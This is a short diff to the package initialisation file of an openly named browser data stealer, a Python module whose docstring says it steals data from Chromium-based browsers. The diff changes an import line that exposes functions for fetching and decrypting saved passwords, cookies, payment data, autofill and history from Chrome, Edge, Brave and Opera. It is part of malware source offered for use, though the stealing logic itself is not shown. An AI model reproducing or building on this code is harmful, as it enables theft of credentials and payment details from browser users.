@@ -8,4 +8,4 @@ Module for stealing data from chromium based browsers
 :license: MIT, see https://github.com/Josakko/browser_stealer/blob/main/LICENSE for more details
 """
 
-from .browser_stealer import run, opera_gx, opera, chrome, chrome, chromium, edge, brave, fetch_autofill, fetch_bookmarks, fetch_cookies, decrypt_fetch_cookies, fetch_history, fetch_downloads, fetch_passwords, fetch_payment, delete_files, zip, copyfile
+from .browser_stealer import Utils, run, opera_gx, opera, chrome, chrome, chromium, edge, brave, fetch_autofill, fetch_bookmarks, fetch_cookies, decrypt_fetch_cookies, fetch_history, fetch_downloads, fetch_passwords, fetch_payment
